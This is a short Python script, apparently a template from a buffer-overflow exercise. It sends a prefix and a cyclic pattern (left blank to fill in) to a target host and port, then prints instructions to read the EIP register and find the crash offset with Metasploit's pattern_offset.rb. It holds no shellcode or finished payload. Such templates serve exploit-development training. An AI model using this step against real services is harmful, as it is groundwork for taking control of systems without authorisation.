#!/usr/bin/python3
from details import *
import socket

## to fill #

pattern = b""

############

s = socket.socket()
s.connect((HOST, PORT))
initial(s)

payload = [
    PREFIX,
    pattern
]
s.send(b''.join(payload))
s.close()
print(f"Copy the EIP register, run\n/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l {len(pattern)} -q value\nand then store the value as OFFSET in details.py")
